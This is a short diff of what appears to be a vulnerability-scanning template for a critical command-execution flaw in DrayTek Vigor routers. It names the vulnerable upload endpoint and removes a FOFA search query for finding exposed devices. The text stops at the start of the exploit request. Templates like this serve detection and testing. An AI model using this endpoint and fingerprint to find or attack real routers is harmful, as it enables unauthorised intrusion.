@@ -3,12 +3,8 @@ info:
   name: DrayTekVigor cvmcfgupload存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hqn7knwnn07vcotd'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hqn7knwnn07vcotd
-    fofa: body="excanvas.js" && "lang == \"zh-cn\"" && "detectLang" && server=="DWS"
 http:
 - raw:
   - 'POST /cgi-bin/mainfunction.cgi/cvmcfgupload?1=2 HTTP/1.1
